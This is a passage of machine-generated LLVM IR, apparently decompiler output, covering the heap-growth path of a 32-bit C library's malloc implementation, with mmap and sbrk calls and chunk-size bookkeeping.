  br i1 %v2_e630, label %dec_label_pc_e64c, label %dec_label_pc_e63c

dec_label_pc_e63c:                                ; preds = %dec_label_pc_e62c
  %v0_e63c = call i32 @__malloc_consolidate()
  %v0_e640 = load i32, i32* @sl, align 4
  %v1_e640 = add i32 %v0_e640, -7
  store i32 %v1_e640, i32* %r0.global-to-local, align 4
  %v1_e644 = call i32 @malloc(i32 %v1_e640)
  store i32 %v1_e644, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ea30

dec_label_pc_e64c:                                ; preds = %dec_label_pc_e62c
  %v1_e64c = add i32 %v4_e5e8, 844
  %v2_e64c = inttoptr i32 %v1_e64c to i32*
  %v3_e64c = load i32, i32* %v2_e64c, align 4
  store i32 %v3_e64c, i32* %r3.global-to-local, align 4
  %v3_e650 = icmp ult i32 %v0_e5f4, %v3_e64c
  %v1_e654 = add i32 %v3_e634, -1
  store i32 %v1_e654, i32* %sb.global-to-local, align 4
  br i1 %v3_e650, label %dec_label_pc_e728, label %dec_label_pc_e65c

dec_label_pc_e65c:                                ; preds = %dec_label_pc_e64c
  %v1_e65c = add i32 %v4_e5e8, 852
  %v2_e65c = inttoptr i32 %v1_e65c to i32*
  %v3_e65c = load i32, i32* %v2_e65c, align 4
  store i32 %v3_e65c, i32* %r2.global-to-local, align 4
  %v1_e660 = add i32 %v4_e5e8, 848
  %v2_e660 = inttoptr i32 %v1_e660 to i32*
  %v3_e660 = load i32, i32* %v2_e660, align 4
  store i32 %v3_e660, i32* %r3.global-to-local, align 4
  %v6_e668 = icmp slt i32 %v3_e660, %v3_e65c
  br i1 %v6_e668, label %dec_label_pc_e66c, label %dec_label_pc_e728

dec_label_pc_e66c:                                ; preds = %dec_label_pc_e65c
  %v1_e66c = add i32 %v0_e5f4, 10
  %v2_e670 = add i32 %v1_e66c, %v3_e634
  store i32 %v2_e670, i32* %r3.global-to-local, align 4
  %v2_e674 = sub i32 0, %v3_e634
  %v3_e674 = and i32 %v2_e670, %v2_e674
  store i32 %v3_e674, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_e674, %v0_e5f4
  br i1 %tmp211, label %dec_label_pc_e680, label %dec_label_pc_e728

dec_label_pc_e680:                                ; preds = %dec_label_pc_e66c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_e674, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_e698 = call i32 @mmap(i32 0, i32 %v3_e674, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_e698, i32* %r0.global-to-local, align 4
  %v7_e69c = icmp eq i32 %v6_e698, -1
  br i1 %v7_e69c, label %dec_label_pc_e680.dec_label_pc_e728_crit_edge, label %dec_label_pc_e6a4

dec_label_pc_e680.dec_label_pc_e728_crit_edge:    ; preds = %dec_label_pc_e680
  %v1_e74c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_e728

dec_label_pc_e6a4:                                ; preds = %dec_label_pc_e680
  %v1_e6a4 = urem i32 %v6_e698, 8
  store i32 %v1_e6a4, i32* %r2.global-to-local, align 4
  %v2_e6a4 = icmp eq i32 %v1_e6a4, 0
  br i1 %v2_e6a4, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e6a4
  %v2_e6a8 = sub nsw i32 8, %v1_e6a4
  store i32 %v2_e6a8, i32* %r3.global-to-local, align 4
  %v2_e6ac = load i32, i32* @r4, align 4
  %v3_e6ac = sub i32 %v2_e6ac, %v2_e6a8
  %v3_e6b0 = add i32 %v2_e6a8, %v6_e698
  store i32 %v3_e6b0, i32* %lr.global-to-local, align 4
  %v2_e6b8 = or i32 %v3_e6ac, 2
  store i32 %v2_e6b8, i32* %r2.global-to-local, align 4
  %v5_e6c0 = inttoptr i32 %v3_e6b0 to i32*
  store i32 %v2_e6a8, i32* %v5_e6c0, align 4
  %v1_e6c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_e6c4 = load i32, i32* %lr.global-to-local, align 4
  %v3_e6c4 = add i32 %v2_e6c4, 4
  %v4_e6c4 = inttoptr i32 %v3_e6c4 to i32*
  store i32 %v1_e6c4, i32* %v4_e6c4, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_e6a4
  store i32 %v6_e698, i32* %lr.global-to-local, align 4
  %v1_e6bc47 = load i32, i32* @r4, align 4
  %v2_e6bc48 = or i32 %v1_e6bc47, 2
  store i32 %v2_e6bc48, i32* %r3.global-to-local, align 4
  %v3_e6c8 = inttoptr i32 %v6_e698 to i32*
  store i32 0, i32* %v3_e6c8, align 4
  %v1_e6cc = load i32, i32* %r3.global-to-local, align 4
  %v2_e6cc = load i32, i32* %lr.global-to-local, align 4
  %v3_e6cc = add i32 %v2_e6cc, 4
  %v4_e6cc = inttoptr i32 %v3_e6cc to i32*
  store i32 %v1_e6cc, i32* %v4_e6cc, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e6d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e6d8, i32* %ip.global-to-local, align 4
  %v1_e6dc = add i32 %v4_e6d8, 848
  %v2_e6dc = inttoptr i32 %v1_e6dc to i32*
  %v3_e6dc = load i32, i32* %v2_e6dc, align 4
  store i32 %v3_e6dc, i32* %r3.global-to-local, align 4
  %v1_e6e0 = add i32 %v4_e6d8, 856
  %v2_e6e0 = inttoptr i32 %v1_e6e0 to i32*
  %v3_e6e0 = load i32, i32* %v2_e6e0, align 4
  store i32 %v3_e6e0, i32* %r2.global-to-local, align 4
  %v1_e6e4 = add i32 %v3_e6dc, 1
  store i32 %v1_e6e4, i32* %r3.global-to-local, align 4
  %v7_e6ec = icmp sgt i32 %v1_e6e4, %v3_e6e0
  br i1 %v7_e6ec, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_e6e4, i32* %v2_e6e0, align 4
  %v0_e6f0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_e6f0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_e6f0 = phi i32 [ %v4_e6d8, %.thread27 ], [ %v1_e6f0.pre, %bb147 ]
  %v0_e6f0 = phi i32 [ %v1_e6e4, %.thread27 ], [ %v0_e6f0.pre, %bb147 ]
  %v2_e6f0 = add i32 %v1_e6f0, 848
  %v3_e6f0 = inttoptr i32 %v2_e6f0 to i32*
  store i32 %v0_e6f0, i32* %v3_e6f0, align 4
  %v0_e6f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e6f4 = add i32 %v0_e6f4, 868
  %v2_e6f4 = inttoptr i32 %v1_e6f4 to i32*
  %v3_e6f4 = load i32, i32* %v2_e6f4, align 4
  store i32 %v3_e6f4, i32* %r3.global-to-local, align 4
  %v1_e6f8 = add i32 %v0_e6f4, 880
  %v2_e6f8 = inttoptr i32 %v1_e6f8 to i32*
  %v3_e6f8 = load i32, i32* %v2_e6f8, align 4
  store i32 %v3_e6f8, i32* %r2.global-to-local, align 4
  %v0_e6fc = load i32, i32* @r4, align 4
  %v2_e6fc = add i32 %v0_e6fc, %v3_e6f4
  store i32 %v2_e6fc, i32* %r1.global-to-local, align 4
  %v1_e700 = add i32 %v0_e6f4, 872
  %v2_e700 = inttoptr i32 %v1_e700 to i32*
  %v3_e700 = load i32, i32* %v2_e700, align 4
  store i32 %v3_e700, i32* %r3.global-to-local, align 4
  %v1_e708 = add i32 %v0_e6f4, 884
  %v2_e708 = inttoptr i32 %v1_e708 to i32*
  %v3_e708 = load i32, i32* %v2_e708, align 4
  store i32 %v3_e708, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_e6fc, %v3_e6f8
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_e6fc, i32* %v2_e6f8, align 4
  %v0_e710.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e710.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_e710 = phi i32 [ %v0_e6f4, %bb148 ], [ %v1_e710.pre, %bb149 ]
  %v0_e710 = phi i32 [ %v2_e6fc, %bb148 ], [ %v0_e710.pre, %bb149 ]
  %v2_e710 = add i32 %v1_e710, 868
  %v3_e710 = inttoptr i32 %v2_e710 to i32*
  store i32 %v0_e710, i32* %v3_e710, align 4
  %v0_e714 = load i32, i32* %r1.global-to-local, align 4
  %v1_e714 = load i32, i32* %r3.global-to-local, align 4
  %v2_e714 = add i32 %v1_e714, %v0_e714
  store i32 %v2_e714, i32* %r1.global-to-local, align 4
  %v1_e718 = load i32, i32* %r2.global-to-local, align 4
  %v0_e71c = load i32, i32* %lr.global-to-local, align 4
  %v1_e71c = add i32 %v0_e71c, 8
  store i32 %v1_e71c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_e714, %v1_e718
  br i1 %tmp213, label %bb151, label %dec_label_pc_ea30

bb151:                                            ; preds = %bb150
  %v5_e720 = load i32, i32* %ip.global-to-local, align 4
  %v6_e720 = add i32 %v5_e720, 884
  %v7_e720 = inttoptr i32 %v6_e720 to i32*
  store i32 %v2_e714, i32* %v7_e720, align 4
  br label %dec_label_pc_ea30

dec_label_pc_e728:                                ; preds = %dec_label_pc_e66c, %dec_label_pc_e64c, %dec_label_pc_e680.dec_label_pc_e728_crit_edge, %dec_label_pc_e65c
  %v1_e74c = phi i32 [ %v1_e74c.pre, %dec_label_pc_e680.dec_label_pc_e728_crit_edge ], [ %v0_e5f4, %dec_label_pc_e65c ], [ %v0_e5f4, %dec_label_pc_e64c ], [ %v0_e5f4, %dec_label_pc_e66c ]
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  %v4_e730 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e730, i32* %r3.global-to-local, align 4
  %v1_e734 = add i32 %v4_e730, 44
  %v2_e734 = inttoptr i32 %v1_e734 to i32*
  %v3_e734 = load i32, i32* %v2_e734, align 4
  store i32 %v3_e734, i32* %r0.global-to-local, align 4
  %v1_e738 = add i32 %v4_e730, 864
  %v2_e738 = inttoptr i32 %v1_e738 to i32*
  %v3_e738 = load i32, i32* %v2_e738, align 4
  store i32 %v3_e738, i32* %r2.global-to-local, align 4
  %v1_e73c = add i32 %v4_e730, 840
  %v2_e73c = inttoptr i32 %v1_e73c to i32*
  %v3_e73c = load i32, i32* %v2_e73c, align 4
  store i32 %v3_e73c, i32* %r3.global-to-local, align 4
  %v1_e740 = add i32 %v3_e734, 4
  %v2_e740 = inttoptr i32 %v1_e740 to i32*
  %v3_e740 = load i32, i32* %v2_e740, align 4
  store i32 %v3_e740, i32* %r1.global-to-local, align 4
  %v1_e748 = urem i32 %v3_e738, 2
  %v2_e748 = icmp eq i32 %v1_e748, 0
  %v1_e744 = add i32 %v1_e74c, 16
  %v2_e74c = add i32 %v1_e744, %v3_e73c
  store i32 %v2_e74c, i32* %r3.global-to-local, align 4
  %v1_e750 = and i32 %v3_e740, -4
  store i32 %v1_e750, i32* @r8, align 4
  br i1 %v2_e748, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_e728
  %v3_e754 = sub i32 %v2_e74c, %v1_e750
  store i32 %v3_e754, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_e728, %bb152
  %v0_e758 = phi i32 [ %v2_e74c, %dec_label_pc_e728 ], [ %v3_e754, %bb152 ]
  %v1_e758 = load i32, i32* %sb.global-to-local, align 4
  %v2_e758 = add i32 %v1_e758, %v0_e758
  store i32 %v2_e758, i32* %r3.global-to-local, align 4
  %v1_e75c = sub i32 -1, %v1_e758
  store i32 %v1_e75c, i32* %fp.global-to-local, align 4
  %v2_e760 = and i32 %v2_e758, %v1_e75c
  store i32 %v2_e760, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_e760, 1
  br i1 %tmp154, label %dec_label_pc_e784, label %dec_label_pc_e770

dec_label_pc_e770:                                ; preds = %bb153
  store i32 %v2_e760, i32* %r0.global-to-local, align 4
  %v1_e774 = call i32 @__GI_sbrk(i32 %v2_e760)
  store i32 %v1_e774, i32* %r0.global-to-local, align 4
  %v3_e778 = icmp eq i32 %v1_e774, -1
  store i32 %v1_e774, i32* @r4, align 4
  br i1 %v3_e778, label %dec_label_pc_e784, label %dec_label_pc_e7f0

dec_label_pc_e784:                                ; preds = %dec_label_pc_e770, %bb153
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  %v4_e78c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e78c, i32* %r6.global-to-local, align 4
  %v1_e790 = add i32 %v4_e78c, 864
  %v2_e790 = inttoptr i32 %v1_e790 to i32*
  %v3_e790 = load i32, i32* %v2_e790, align 4
  store i32 %v3_e790, i32* %r3.global-to-local, align 4
  %v1_e794 = urem i32 %v3_e790, 2
  %v2_e794 = icmp eq i32 %v1_e794, 0
  br i1 %v2_e794, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_e784
  %v1_e798 = load i32, i32* @r8, align 4
  %v2_e798 = load i32, i32* %sb.global-to-local, align 4
  %v3_e798 = add i32 %v2_e798, %v1_e798
  %v2_e79c = load i32, i32* @r5, align 4
  %v3_e79c = add i32 %v3_e798, %v2_e79c
  store i32 %v3_e79c, i32* %r3.global-to-local, align 4
  %v2_e7a0 = load i32, i32* %fp.global-to-local, align 4
  %v3_e7a0 = and i32 %v2_e7a0, %v3_e79c
  store i32 %v3_e7a0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_e784
  %v0_e7a4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_e7a4 = phi i32 [ %v0_e7a4.pr, %.thread29thread-pre-split ], [ %v3_e7a0, %bb155 ]
  %v2_e7a4 = icmp ugt i32 %v0_e7a4, 1048575
  br i1 %v2_e7a4, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_e7bc = phi i32 [ %v0_e7a4, %.thread29 ], [ 1048576, %bb156 ]
  %v1_e7ac = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_e7bc, %v1_e7ac
  br i1 %tmp214, label %dec_label_pc_e7b4, label %dec_label_pc_ea18

dec_label_pc_e7b4:                                ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_e7bc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_e7d0 = call i32 @mmap(i32 0, i32 %v0_e7bc, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_e7d0, i32* %r0.global-to-local, align 4
  %v3_e7d4 = icmp eq i32 %v6_e7d0, -1
  %v8_e7d4 = icmp eq i32 %v6_e7d0, -1
  store i32 %v6_e7d0, i32* @r4, align 4
  br i1 %v8_e7d4, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_e7b4
  %v1_e7dc = load i32, i32* %r6.global-to-local, align 4
  %v2_e7dc = add i32 %v1_e7dc, 864
  %v3_e7dc = inttoptr i32 %v2_e7dc to i32*
  %v4_e7dc = load i32, i32* %v3_e7dc, align 4
  %v2_e7e0 = load i32, i32* @r5, align 4
  %v3_e7e0 = add i32 %v2_e7e0, %v6_e7d0
  store i32 %v3_e7e0, i32* %r0.global-to-local, align 4
  %v2_e7e4 = and i32 %v4_e7dc, -2
  store i32 %v2_e7e4, i32* %r3.global-to-local, align 4
  store i32 %v2_e7e4, i32* %v3_e7dc, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_e7b4, %bb158
  br i1 %v3_e7d4, label %dec_label_pc_e7f0, label %dec_label_pc_e7f4

dec_label_pc_e7f0:                                ; preds = %.thread32, %dec_label_pc_e770
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e7f4

dec_label_pc_e7f4:                                ; preds = %.thread32, %dec_label_pc_e7f0
  %v0_e7f4 = load i32, i32* @r4, align 4
  %v7_e7f4 = icmp eq i32 %v0_e7f4, -1
  br i1 %v7_e7f4, label %dec_label_pc_ea18, label %dec_label_pc_e7fc

dec_label_pc_e7fc:                                ; preds = %dec_label_pc_e7f4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v4_e804 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e804, i32* %ip.global-to-local, align 4
  store i32 %v3_e734, i32* %r2.global-to-local, align 4
  %v1_e80c = add i32 %v4_e804, 872
  %v2_e80c = inttoptr i32 %v1_e80c to i32*
  %v3_e80c = load i32, i32* %v2_e80c, align 4
  %v1_e810 = load i32, i32* @r8, align 4
  %v2_e810 = add i32 %v1_e810, %v3_e734
  store i32 %v2_e810, i32* %r1.global-to-local, align 4
  %v0_e814 = load i32, i32* @r5, align 4
  %v2_e814 = add i32 %v0_e814, %v3_e80c
  store i32 %v2_e814, i32* %r3.global-to-local, align 4
  %v9_e818 = icmp eq i32 %v0_e7f4, %v2_e810
  br i1 %v9_e818, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_e7fc
  store i32 %v2_e814, i32* %v2_e80c, align 4
  br label %dec_label_pc_e834

bb159:                                            ; preds = %dec_label_pc_e7fc
  %v1_e81c = load i32, i32* %r0.global-to-local, align 4
  %v8_e81c = icmp eq i32 %v1_e81c, -1
  store i32 %v2_e814, i32* %v2_e80c, align 4
  br i1 %v8_e81c, label %.thread34, label %dec_label_pc_e834

.thread34:                                        ; preds = %bb159
  %v1_e824 = load i32, i32* @r5, align 4
  %v2_e824 = load i32, i32* @r8, align 4
  %v3_e824 = add i32 %v2_e824, %v1_e824
  %v2_e828 = or i32 %v3_e824, 1
  store i32 %v2_e828, i32* %r3.global-to-local, align 4
  %v2_e82c = load i32, i32* %r2.global-to-local, align 4
  %v3_e82c = add i32 %v2_e82c, 4
  %v4_e82c = inttoptr i32 %v3_e82c to i32*
  store i32 %v2_e828, i32* %v4_e82c, align 4
  br label %dec_label_pc_e9ac

dec_label_pc_e834:                                ; preds = %bb159, %.thread122
  %v0_e838.pr = load i32, i32* @r8, align 4
  %v0_e834 = load i32, i32* %ip.global-to-local, align 4
  %v1_e834 = add i32 %v0_e834, 864
  %v2_e834 = inttoptr i32 %v1_e834 to i32*
  %v3_e834 = load i32, i32* %v2_e834, align 4
  store i32 %v3_e834, i32* %r2.global-to-local, align 4
  %v2_e838 = icmp eq i32 %v0_e838.pr, 0
  br i1 %v2_e838, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_e834
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_e834
  %v2_e840 = urem i32 %v3_e834, 2
  store i32 %v2_e840, i32* %r3.global-to-local, align 4
  %v2_e844 = icmp eq i32 %v2_e840, 0
  br i1 %v2_e844, label %.thread40, label %dec_label_pc_e84c

dec_label_pc_e84c:                                ; preds = %.thread36
  %v0_e84c = load i32, i32* @r4, align 4
  %v1_e84c = load i32, i32* %r1.global-to-local, align 4
  %v3_e84c = icmp ult i32 %v0_e84c, %v1_e84c
  br i1 %v3_e84c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_e84c
  %v2_e850 = and i32 %v3_e834, -2
  store i32 %v2_e850, i32* %r3.global-to-local, align 4
  store i32 %v2_e850, i32* %v2_e834, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_e84c, %.thread37, %.thread36, %bb160
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  %v4_e860 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e860, i32* @r7, align 4
  %v1_e864 = add i32 %v4_e860, 864
  %v2_e864 = inttoptr i32 %v1_e864 to i32*
  %v3_e864 = load i32, i32* %v2_e864, align 4
  store i32 %v3_e864, i32* %r3.global-to-local, align 4
  %v1_e868 = urem i32 %v3_e864, 2
  store i32 %v1_e868, i32* @r6, align 4
  %v2_e868 = icmp eq i32 %v1_e868, 0
  br i1 %v2_e868, label %dec_label_pc_e8fc, label %dec_label_pc_e870

dec_label_pc_e870:                                ; preds = %.thread40
  %v0_e870 = load i32, i32* @r8, align 4
  %v2_e870 = icmp eq i32 %v0_e870, 0
  br i1 %v2_e870, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_e870
  %v2_e874 = add i32 %v4_e860, 872
  %v3_e874 = inttoptr i32 %v2_e874 to i32*
  %v4_e874 = load i32, i32* %v3_e874, align 4
  store i32 %v4_e874, i32* %r2.global-to-local, align 4
  %v1_e878 = load i32, i32* %r1.global-to-local, align 4
  %v2_e878 = load i32, i32* @r4, align 4
  %v3_e878 = sub i32 %v2_e878, %v1_e878
  %v3_e87c = add i32 %v3_e878, %v4_e874
  store i32 %v3_e87c, i32* %r3.global-to-local, align 4
  store i32 %v3_e87c, i32* %v3_e874, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_e870, %bb161
  %v0_e884 = load i32, i32* @r4, align 4
  %v1_e884 = urem i32 %v0_e884, 8
  store i32 %v1_e884, i32* %r3.global-to-local, align 4
  %v2_e884 = icmp eq i32 %v1_e884, 0
  br i1 %v2_e884, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_e888 = sub nsw i32 8, %v1_e884
  store i32 %v2_e888, i32* %r3.global-to-local, align 4
  %v3_e88c = add i32 %v2_e888, %v0_e884
  store i32 %v3_e88c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_e894 = phi i32 [ 0, %.thread43 ], [ %v2_e888, %bb162 ]
  %v1_e890 = load i32, i32* @r5, align 4
  %v2_e890 = add i32 %v1_e890, %v0_e884
  store i32 %v2_e890, i32* @r6, align 4
  %v1_e894 = load i32, i32* @r8, align 4
  %v2_e894 = add i32 %v2_e890, %v0_e894
  %v2_e898 = add i32 %v2_e894, %v1_e894
  store i32 %v2_e898, i32* %r1.global-to-local, align 4
  %v1_e89c = load i32, i32* %sb.global-to-local, align 4
  %v2_e89c = add i32 %v1_e89c, %v2_e898
  %v1_e8a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_e8a0 = and i32 %v1_e8a0, %v2_e89c
  store i32 %v2_e8a0, i32* %r2.global-to-local, align 4
  %v2_e8a4 = sub i32 0, %v2_e890
  store i32 %v2_e8a4, i32* %r3.global-to-local, align 4
  %v2_e8a8 = sub i32 %v2_e8a0, %v2_e890
  store i32 %v2_e8a8, i32* @r5, align 4
  store i32 %v2_e8a8, i32* %r0.global-to-local, align 4
  br i1 %v2_e884, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_e884, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_e8b4 = call i32 @__GI_sbrk(i32 %v2_e8a8)
  store i32 %v1_e8b4, i32* %r0.global-to-local, align 4
  %v3_e8b8 = icmp eq i32 %v1_e8b4, -1
  br i1 %v3_e8b8, label %dec_label_pc_e8c0, label %dec_label_pc_e8d0

dec_label_pc_e8c0:                                ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_e8c4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_e8c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_e928

dec_label_pc_e8d0:                                ; preds = %bb164
  %v1_e8d0 = load i32, i32* @r4, align 4
  %v3_e8d0 = icmp ult i32 %v1_e8b4, %v1_e8d0
  br i1 %v3_e8d0, label %dec_label_pc_e8d8, label %dec_label_pc_e928

dec_label_pc_e8d8:                                ; preds = %dec_label_pc_e8d0
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r0.global-to-local, align 4
  %v4_e8e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e8e0, i32* %r2.global-to-local, align 4
  %v1_e8e4 = add i32 %v4_e8e0, 864
  %v2_e8e4 = inttoptr i32 %v1_e8e4 to i32*
  %v3_e8e4 = load i32, i32* %v2_e8e4, align 4
  %v0_e8e8 = load i32, i32* @r6, align 4
  store i32 %v0_e8e8, i32* %r0.global-to-local, align 4
  %v1_e8ec = and i32 %v3_e8e4, -2
  store i32 %v1_e8ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_e8ec, i32* %v2_e8e4, align 4
  br label %dec_label_pc_e928

dec_label_pc_e8fc:                                ; preds = %.thread40
  %v0_e8fc = load i32, i32* %r0.global-to-local, align 4
  %v3_e8fc = icmp eq i32 %v0_e8fc, -1
  br i1 %v3_e8fc, label %dec_label_pc_e904, label %dec_label_pc_e920

dec_label_pc_e904:                                ; preds = %dec_label_pc_e8fc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_e908 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_e908, i32* %r0.global-to-local, align 4
  %v0_e90c = load i32, i32* @r7, align 4
  %v1_e90c = add i32 %v0_e90c, 872
  %v2_e90c = inttoptr i32 %v1_e90c to i32*
  %v3_e90c = load i32, i32* %v2_e90c, align 4
  store i32 %v3_e90c, i32* %r2.global-to-local, align 4
  %v0_e910 = load i32, i32* @r4, align 4
  %v0_e914 = load i32, i32* @r5, align 4
  %v2_e910 = add i32 %v3_e90c, %v1_e908
  %v2_e914 = sub i32 %v2_e910, %v0_e910
  %v2_e918 = sub i32 %v2_e914, %v0_e914
  store i32 %v2_e918, i32* %r3.global-to-local, align 4
  store i32 %v2_e918, i32* %v2_e90c, align 4
  %v0_e924.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e920

dec_label_pc_e920:                                ; preds = %dec_label_pc_e8fc, %dec_label_pc_e904
  %v0_e924 = phi i32 [ 0, %dec_label_pc_e8fc ], [ %v0_e924.pre, %dec_label_pc_e904 ]
  %v0_e920 = load i32, i32* @r4, align 4
  store i32 %v0_e920, i32* @r7, align 4
  store i32 %v0_e924, i32* @r5, align 4
  br label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %dec_label_pc_e8d0, %dec_label_pc_e8d8, %dec_label_pc_e8c0, %dec_label_pc_e920
  %v0_e928 = load i32, i32* %r0.global-to-local, align 4
  %v7_e928 = icmp eq i32 %v0_e928, -1
  br i1 %v7_e928, label %dec_label_pc_e9ac, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e928
  %v1_e930 = load i32, i32* @r5, align 4
  %v2_e930 = add i32 %v1_e930, %v0_e928
  %v0_e934 = load i32, i32* @r7, align 4
  %v2_e934 = sub i32 %v2_e930, %v0_e934
  %v1_e938 = or i32 %v2_e934, 1
  %v2_e93c = add i32 %v0_e934, 4
  %v3_e93c = inttoptr i32 %v2_e93c to i32*
  store i32 %v1_e938, i32* %v3_e93c, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e948 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e948, i32* @r6, align 4
  %v1_e94c = add i32 %v4_e948, 872
  %v2_e94c = inttoptr i32 %v1_e94c to i32*
  %v3_e94c = load i32, i32* %v2_e94c, align 4
  %v0_e950 = load i32, i32* @r8, align 4
  %v2_e950 = icmp eq i32 %v0_e950, 0
  %v0_e954 = load i32, i32* @r5, align 4
  %v2_e954 = add i32 %v0_e954, %v3_e94c
  store i32 %v2_e954, i32* %r3.global-to-local, align 4
  store i32 %v2_e954, i32* %v2_e94c, align 4
  %v0_e95c = load i32, i32* @r7, align 4
  %v1_e95c = load i32, i32* @r6, align 4
  %v2_e95c = add i32 %v1_e95c, 44
  %v3_e95c = inttoptr i32 %v2_e95c to i32*
  store i32 %v0_e95c, i32* %v3_e95c, align 4
  br i1 %v2_e950, label %dec_label_pc_e9ac, label %dec_label_pc_e964

dec_label_pc_e964:                                ; preds = %dec_label_pc_e930
  %v0_e968 = load i32, i32* @r8, align 4
  %v1_e968 = add i32 %v0_e968, -12
  %v1_e96c = and i32 %v1_e968, -8
  store i32 %v3_e734, i32* %ip.global-to-local, align 4
  %v2_e974 = add i32 %v1_e96c, %v3_e734
  store i32 %v2_e974, i32* %r1.global-to-local, align 4
  %v2_e978 = icmp ugt i32 %v1_e96c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_e980 = or i32 %v1_e96c, 1
  store i32 %v1_e980, i32* %r3.global-to-local, align 4
  store i32 %v1_e980, i32* %v2_e740, align 4
